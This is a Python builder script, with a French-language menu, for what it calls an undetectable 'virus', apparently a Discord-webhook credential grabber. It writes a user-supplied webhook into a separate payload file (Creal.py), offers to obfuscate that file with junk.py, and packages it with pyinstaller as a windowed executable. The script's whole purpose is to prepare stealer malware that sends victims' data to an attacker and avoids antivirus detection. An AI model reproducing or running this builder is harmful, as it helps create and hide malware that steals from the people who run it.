from pystyle import *
import os
import subprocess
import requests
from colorama import *
import time

os.system('clear' if os.name == 'posix' else 'cls')

intro = """

  ________  ________  ________          ________  ________  ________  ________  ________  _______   ________     
|\   __  \|\_____  \|\   __  \        |\   ____\|\   __  \|\   __  \|\   __  \|\   __  \|\  ___ \ |\   __  \    
\ \  \|\ /_\|___/  /\ \  \|\ /_       \ \  \___|\ \  \|\  \ \  \|\  \ \  \|\ /\ \  \|\ /\ \   __/|\ \  \|\  \   
 \ \   __  \   /  / /\ \   __  \       \ \  \  __\ \   _  _\ \   __  \ \   __  \ \   __  \ \  \_|/_\ \   _  _\   𝐵𝓎 𝐵𝒶𝓁𝒾𝒸𝑜 𝒶𝓃𝒹 𝒵𝑒𝓎𝓇𝑜𝓍 𝒶𝓃𝒹 𝐵𝒾𝑔𝒦𝓊𝓇𝒶
  \ \  \|\  \ /  /_/__\ \  \|\  \       \ \  \|\  \ \  \\  \\ \  \ \  \ \  \|\  \ \  \|\  \ \  \_|\ \ \  \\  \| 
   \ \_______\\________\ \_______\       \ \_______\ \__\\ _\\ \__\ \__\ \_______\ \_______\ \_______\ \__\\ _\ 
    \|_______|\|_______|\|_______|        \|_______|\|__|\|__|\|__|\|__|\|_______|\|_______|\|_______|\|__|\|__|        

                > Press Enter                                         

"""

Anime.Fade(Center.Center(intro), Colors.blue_to_purple, Colorate.Vertical, interval=0.050, enter=True)


print(f"""{Fore.LIGHTBLUE_EX}

  ________  ________  ________          ________  ________  ________  ________  ________  _______   ________     
|\   __  \|\_____  \|\   __  \        |\   ____\|\   __  \|\   __  \|\   __  \|\   __  \|\  ___ \ |\   __  \    
\ \  \|\ /_\|___/  /\ \  \|\ /_       \ \  \___|\ \  \|\  \ \  \|\  \ \  \|\ /\ \  \|\ /\ \   __/|\ \  \|\  \   
 \ \   __  \   /  / /\ \   __  \       \ \  \  __\ \   _  _\ \   __  \ \   __  \ \   __  \ \  \_|/_\ \   _  _\   𝐵𝓎 𝐵𝒶𝓁𝒾𝒸𝑜 𝒶𝓃𝒹 𝒵𝑒𝓎𝓇𝑜𝓍 𝒶𝓃𝒹 𝐵𝒾𝑔𝒦𝓊𝓇𝒶
  \ \  \|\  \ /  /_/__\ \  \|\  \       \ \  \|\  \ \  \\  \\ \  \ \  \ \  \|\  \ \  \|\  \ \  \_|\ \ \  \\  \| 
   \ \_______\\________\ \_______\       \ \_______\ \__\\ _\\ \__\ \__\ \_______\ \_______\ \_______\ \__\\ _\ 
    \|_______|\|_______|\|_______|        \|_______|\|__|\|__|\|__|\|__|\|_______|\|_______|\|_______|\|__|\|__|
                                                                                                                   

            Welcome to builder

""")

time.sleep(1)


while True:
    
    Write.Print("\nQuelle option voulez choisir ?: ", Colors.purple_to_blue)
    Write.Print("\n1. Build Exe", Colors.purple_to_blue)
    Write.Print("\n2. Build FUD Exe (Virus indetectable)", Colors.purple_to_blue)
    Write.Print("\n3. fermer", Colors.purple_to_blue)
    Write.Print("\n faites votre choix : ", Colors.purple_to_blue, end="")
    choice = input()

    if choice == "1":
        os.system("cls || clear")
        webhook = input(Fore.CYAN + "\nentre ton webhook: " + Style.RESET_ALL)

        filename = "Creal.py"
        filepath = os.path.join(os.getcwd(), filename)
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
        new_content = content.replace('"WEBHOOK ici"', f'"{webhook}"')
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
        Write.Print(f"\n{filename} fichier ameliorer.", Colors.purple_to_blue)

        obfuscate = False
        while True:
            answer = input(Fore.CYAN + "\nveux tu le junk ton  code?  (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                os.system("python junk.py")
                Write.Print(f"\n{filename} Ton fichier a etais  junked.", Colors.purple_to_blue)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nse que tu as entrer est invalide. essaye encore.", Colors.purple_to_blue)

        while True:
            answer = input(Fore.CYAN + "\n veux tu creer un fichier? (Y/N) " + Style.RESET_ALL)
            if answer.upper() == "Y":
                if not obfuscate:
                    cmd = f"pyinstaller --onefile --windowed {filename}"
                else:
                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
                subprocess.call(cmd, shell=True)
                Write.Print(f"\n{filename} le fichier a etais convertis en exe.", Colors.purple_to_blue)
                break
            elif answer.upper() == "N":
                break
            else:
                Write.Print("\nse que tu as entrer est invalide. essaye encore.", Colors.purple_to_blue)

    elif choice == "2":
        Write.Print("\ntu peux utiliser se projet gratuitement si tu partage mon discord : ! 𝖇𝖆𝖑𝖎𝖈𝖔 ♆#3518", Colors.purple_to_blue)

    elif choice == "3":
        Write.Print("\nExiting the program...", Colors.purple_to_blue)
        break

    else:
        Write.Print("\nse que tu as entrer est invalide. essaye encore.", Colors.purple_to_blue)
